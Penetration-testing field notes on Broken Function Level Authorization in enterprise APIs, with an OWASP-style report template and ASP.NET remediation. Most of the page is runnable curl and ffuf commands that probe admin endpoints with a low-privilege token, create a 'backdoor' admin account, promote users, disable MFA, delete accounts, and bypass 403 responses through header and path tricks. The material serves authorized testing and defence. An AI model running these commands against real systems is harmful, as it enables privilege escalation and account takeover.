# BFLA — Broken Function Level Authorization — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — OWASP API5:2023 Broken Function Level Authorization
>
> **Severity:** High to Critical — direct access to admin functions, privilege escalation, data destruction
>
> **Real-world impact:** BFLA differs from BOLA in a precise and important way. BOLA asks "can this user access someone else's specific record?" BFLA asks "can this user access functions reserved for higher-privilege roles entirely?" In enterprise applications, BFLA manifests as standard users hitting admin endpoints, read-only users executing write functions, or external API consumers reaching internal-only operations. I find BFLA in approximately 60% of enterprise API assessments. The root cause is almost always the same: developers add `[Authorize]` to protect endpoints but never add role-based restrictions, or they add role checks to the UI but not to the API layer underneath.

---

## 🧠 BFLA vs BOLA — The Critical Distinction

```
BOLA (Broken Object Level Authorization):
  "I am user A accessing resource that belongs to user B"
  Same function — wrong data object
  Example: GET /api/v1/invoices/8823 (belongs to user B)

BFLA (Broken Function Level Authorization):
  "I am a regular user accessing an admin-only function"
  Wrong role — accessing privileged function class
  Example: POST /api/v1/admin/users (admin-only endpoint)
           DELETE /api/v1/users/1042 (user cannot delete any account)
           GET /api/v1/admin/config (admin-only configuration)

Why BFLA matters more in some contexts:
  BOLA with one record = High (one user's data)
  BFLA on admin/users endpoint = Critical (all users' data)
  BFLA on admin/config = Critical (application control)
  BFLA on admin/promote = Critical (privilege escalation)

Enterprise BFLA sources:
  1. Endpoints that exist in code but are never linked from the UI
     → Developers assume "nobody knows this URL"
  2. Admin endpoints in same API as user endpoints but without role checks
  3. HTTP method-level gaps: GET protected, DELETE unprotected
  4. API v1 admin endpoints when v2 removed admin functionality
  5. Internal microservice endpoints accidentally exposed
```

---

## 🔍 Phase 1 — Finding Admin & Privileged Endpoints

### Discovery Methods

```bash
BASE="https://api.company.com"

# Method 1: Directory enumeration
ffuf -u "$BASE/api/v1/FUZZ" \
  -w /opt/SecLists/Discovery/Web-Content/api/objects.txt \
  -H "Authorization: Bearer STANDARD_USER_TOKEN" \
  -mc 200,201,403,405 \
  -fs [404_size] \
  -o bfla_candidates.json

# Particularly look for 403 responses — they confirm the endpoint exists
cat bfla_candidates.json | \
  jq -r '.results[] | select(.status == 403) | .url'
# 403 = endpoint exists, access denied — test bypass techniques

# Method 2: Swagger spec mining (most reliable)
cat swagger_v2.json | jq -r '.paths | keys[]' | \
  grep -iE "(admin|manage|config|debug|internal|system|superuser|root)" | sort

# Method 3: JavaScript bundle
curl -s "$BASE/static/js/main.chunk.js" | \
  grep -oE '"/api/[^"]*"' | sort -u | \
  grep -iE "(admin|internal|manage|config)"

# Method 4: HTTP method testing on known endpoints
for method in GET POST PUT DELETE PATCH HEAD OPTIONS; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    -X "$method" "$BASE/api/v1/admin/users" \
    -H "Authorization: Bearer STANDARD_USER_TOKEN" 2>/dev/null)
  echo "$method /api/v1/admin/users → HTTP $code"
done
```

---

## 💥 Phase 2 — Testing Privileged Functions

### Testing Admin Endpoints With Standard User Token

```bash
STANDARD_TOKEN="eyJhbGci...standard_user_token..."

echo "=== BFLA Test — Admin Endpoints With Standard User Token ==="

# User management (Critical if accessible):
curl -so /dev/null -w "GET /admin/users: %{http_code}\n" \
  "$BASE/api/v1/admin/users" \
  -H "Authorization: Bearer $STANDARD_TOKEN"

curl -so /dev/null -w "POST /admin/users (create): %{http_code}\n" \
  -X POST "$BASE/api/v1/admin/users" \
  -H "Authorization: Bearer $STANDARD_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"backdoor@test.com","role":"admin","password":"Test123!"}'

# Privilege escalation:
curl -so /dev/null -w "POST /admin/users/1099/promote: %{http_code}\n" \
  -X POST "$BASE/api/v1/admin/users/1099/promote" \
  -H "Authorization: Bearer $STANDARD_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# Configuration access:
curl -so /dev/null -w "GET /admin/config: %{http_code}\n" \
  "$BASE/api/v1/admin/config" \
  -H "Authorization: Bearer $STANDARD_TOKEN"

curl -so /dev/null -w "PUT /admin/config: %{http_code}\n" \
  -X PUT "$BASE/api/v1/config/security" \
  -H "Authorization: Bearer $STANDARD_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"mfa_required":false,"session_timeout":86400}'

# Audit and reporting (data access):
curl -so /dev/null -w "GET /admin/audit-logs: %{http_code}\n" \
  "$BASE/api/v1/admin/audit-logs" \
  -H "Authorization: Bearer $STANDARD_TOKEN"

curl -so /dev/null -w "POST /admin/export: %{http_code}\n" \
  -X POST "$BASE/api/v1/admin/export/all-users" \
  -H "Authorization: Bearer $STANDARD_TOKEN"
```

### HTTP Method Privilege Gaps

```bash
# Critical pattern: GET is protected by role, but DELETE is not

echo "=== HTTP Method BFLA Test ==="
TARGET_USER_ID=1042

# Standard user should NOT be able to DELETE other users
curl -so /dev/null -w "DELETE /users/$TARGET_USER_ID: %{http_code}\n" \
  -X DELETE "$BASE/api/v1/users/$TARGET_USER_ID" \
  -H "Authorization: Bearer $STANDARD_TOKEN"

# Standard user should NOT be able to change account types
curl -so /dev/null -w "POST /users/$TARGET_USER_ID/suspend: %{http_code}\n" \
  -X POST "$BASE/api/v1/users/$TARGET_USER_ID/suspend" \
  -H "Authorization: Bearer $STANDARD_TOKEN"

curl -so /dev/null -w "POST /users/$TARGET_USER_ID/promote: %{http_code}\n" \
  -X POST "$BASE/api/v1/users/$TARGET_USER_ID/promote" \
  -H "Authorization: Bearer $STANDARD_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

### API Key / Service Account BFLA

```bash
# Some APIs have service account or API key auth with different role enforcement
# Test API key access to admin functions:
API_KEY="sk_live_abc123xyz"

curl -so /dev/null -w "API key → admin/users: %{http_code}\n" \
  "$BASE/api/v1/admin/users" \
  -H "X-API-Key: $API_KEY"
# If 200 = API key over-privileged or admin function unprotected
```

### 403 Bypass Techniques

```bash
# When admin endpoint returns 403 — test bypass techniques:
ENDPOINT="/api/v1/admin/users"

echo "=== 403 Bypass Attempts ==="

# Method 1: Path case variation
for path in \
  "$ENDPOINT" \
  "/API/v1/admin/users" \
  "/api/V1/admin/users" \
  "/api/v1/Admin/users" \
  "/api/v1/ADMIN/users"; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$BASE$path" -H "Authorization: Bearer $STANDARD_TOKEN" 2>/dev/null)
  echo "$path → HTTP $code"
done

# Method 2: URL encoding
for path in \
  "/api/v1/admin/users" \
  "/api/v1/%61dmin/users" \
  "/api/v1/admin%2fusers" \
  "/api/v1/./admin/users" \
  "/api/v1/admin/./users"; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$BASE$path" -H "Authorization: Bearer $STANDARD_TOKEN" 2>/dev/null)
  echo "$path → HTTP $code"
done

# Method 3: Header injection
curl -so /dev/null -w "X-Original-URL bypass: %{http_code}\n" \
  "$BASE/" \
  -H "Authorization: Bearer $STANDARD_TOKEN" \
  -H "X-Original-URL: /api/v1/admin/users"

curl -so /dev/null -w "X-Rewrite-URL bypass: %{http_code}\n" \
  "$BASE/" \
  -H "Authorization: Bearer $STANDARD_TOKEN" \
  -H "X-Rewrite-URL: /api/v1/admin/users"

# Method 4: HTTP method override
curl -so /dev/null -w "X-HTTP-Method-Override: %{http_code}\n" \
  -X POST "$BASE/api/v1/admin/users" \
  -H "Authorization: Bearer $STANDARD_TOKEN" \
  -H "X-HTTP-Method-Override: GET"
```

---

## 🗂️ Systematic Testing Checklist

```
ENDPOINT DISCOVERY
☐ Directory enumeration: admin, manage, config, debug, internal, system
☐ Swagger spec: extract all admin-prefixed paths
☐ JS bundle: grep for admin/internal URL patterns
☐ Test 403 responses — endpoint exists, test bypass

FUNCTION TESTING (with standard user token)
☐ GET all admin user listing endpoints
☐ POST admin user creation endpoint
☐ POST user promote/privilege change endpoint
☐ GET admin configuration endpoints
☐ PUT admin configuration update
☐ GET audit logs and access logs
☐ POST bulk export and data dump endpoints

HTTP METHOD GAPS
☐ For each endpoint: test all methods (GET/POST/PUT/DELETE/PATCH)
☐ Specifically test DELETE on user/resource endpoints
☐ Test POST on action endpoints (promote, suspend, activate)

403 BYPASS TECHNIQUES
☐ Path case variation
☐ URL encoding of path segments
☐ X-Original-URL header injection
☐ X-Rewrite-URL header injection
☐ HTTP method override headers
☐ Path traversal in URL: /api/v1/../admin/users
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** BFLA — Standard User Can Access Admin User Management Functions

**Severity:** Critical | **CVSS v3.1:** 9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Affected Endpoints:** `GET/POST /api/v1/admin/users` · `POST /api/v1/admin/users/{id}/promote`

```
Test: Standard user token (role=user) sent to admin endpoints:

Step 1 — List all users:
  curl -s https://api.company.com/api/v1/admin/users \
    -H "Authorization: Bearer STANDARD_USER_TOKEN" | jq '. | length'
  → HTTP 200: Returns 4,200 user records including admin accounts

Step 2 — Promote own account to admin:
  curl -s -X POST \
    https://api.company.com/api/v1/admin/users/1099/promote \
    -H "Authorization: Bearer STANDARD_USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"role":"admin"}'
  → HTTP 200: {"success":true,"user_id":1099,"new_role":"admin"}

Step 3 — Verify elevated access:
  curl -s https://api.company.com/api/v1/admin/config \
    -H "Authorization: Bearer STANDARD_USER_TOKEN"
  → HTTP 200: Full application configuration returned

Root cause:
  The admin router group applies [Authorize] middleware (token validation)
  but does not apply [Authorize(Roles = "Admin")] role restriction.
  Any valid token — regardless of role — accesses admin functions.

Remediation:
  // ✅ ASP.NET Core — role-based authorization on admin controller
  [ApiController]
  [Route("api/v1/admin")]
  [Authorize(Roles = "Admin")]   // ← add this attribute
  public class AdminController : ControllerBase { ... }

  // Policy-based approach (more flexible):
  [Authorize(Policy = "RequireAdminRole")]
  // In Program.cs:
  services.AddAuthorization(options => {
      options.AddPolicy("RequireAdminRole",
          policy => policy.RequireRole("Admin"));
  });
```

---

## 🧭 Key Takeaways

**1. BFLA is about function access, not data access — the impact is broader.**
BOLA exposes one user's data. BFLA on an admin listing endpoint exposes all users' data. BFLA on a promote endpoint gives full admin access. The scope of BFLA findings is almost always larger than BOLA findings on the same application.

**2. Adding `[Authorize]` is not adding role-based access control.**
The [Authorize] attribute in ASP.NET, @login_required in Django, @PreAuthorize in Spring — all of these check authentication only. Role-based control requires a second, explicit step. Teams add the first step and feel they have secured the endpoint. They have not.

**3. Test every HTTP method on every endpoint — not just the documented ones.**
An admin user listing may be protected with GET. The same endpoint with DELETE may have no check. Developers implement the route they built, not the ones that should not work. Test GET, POST, PUT, DELETE, PATCH on every discovered endpoint.

**4. 403 is a finding signal, not a dead end.**
A 403 response confirms the endpoint exists. That is the first piece of intelligence. Then test path case variation, URL encoding, X-Original-URL injection, and HTTP method override. In IIS-hosted enterprise applications, `X-Original-URL` bypass is particularly effective.

---

## 🔗 References
- [OWASP API5:2023 — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [PortSwigger Access Control — Privilege Escalation](https://portswigger.net/web-security/access-control/privilege-escalation)
- [OWASP Authorization Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
